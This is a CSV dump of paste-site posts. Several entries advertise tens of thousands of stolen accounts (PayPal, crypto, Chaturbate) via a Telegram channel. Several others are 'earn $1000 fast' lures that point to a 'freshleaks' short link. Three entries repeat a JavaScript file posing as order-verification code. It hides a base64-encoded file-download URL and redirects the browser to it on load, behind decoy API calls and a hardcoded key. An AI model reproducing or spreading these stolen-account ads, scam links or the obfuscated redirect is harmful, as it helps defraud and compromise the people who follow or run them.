id,title,username,language,date,content
NmmDna8S,Chaturbate with Tokens,SpawnKz,JavaScript,Wednesday 30th of April 2025 07:03:41 PM CDT,28510 Accounts Posted On https://t.me/leakzbyeminem
3gRxvTBT,Make $1000 15-MINUTES (BEGINNER) L4,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 06:56:33 PM CDT," 
Pdf https://tinyurl.com/freshleaks

dc62x9RDTA
"
X6vuH7uk,Order.js,WantingTrae,JavaScript,Wednesday 30th of April 2025 06:48:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49837/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kHHYzBRt,Crypto Accounts,SpawnKz,JavaScript,Wednesday 30th of April 2025 06:48:18 PM CDT,33384 Accounts Posted On https://t.me/leakzbyeminem
FtVTgffK,EARN $900 INSTANTLY 2025⭐ GV,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 06:47:19 PM CDT," 
Pdf https://tinyurl.com/freshleaks

ygHK0ZMoGx
"
7iA9tATv,Make $1000 15-MINUTES  (BEGINNER) YR,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 06:38:06 PM CDT," 
Pdf https://tinyurl.com/freshleaks

qXVIiVemmO
"
9LDLUzBn,Market.js,WantingTrae,JavaScript,Wednesday 30th of April 2025 06:33:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18065/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jWdVNJXm,PayPal with Balance,SpawnKz,JavaScript,Wednesday 30th of April 2025 06:32:56 PM CDT,11340 Accounts Posted On https://t.me/leakzbyeminem
84AVRbfu,EARN $900 INSTANTLY 2025 95,MOHAMED69_VS,JavaScript,Wednesday 30th of April 2025 06:28:52 PM CDT," 
Pdf https://tinyurl.com/freshleaks

S1Ctl46nHK
"
Ex8Hvqkh,Untitled,WantingTrae,JavaScript,Wednesday 30th of April 2025 06:17:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84331/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
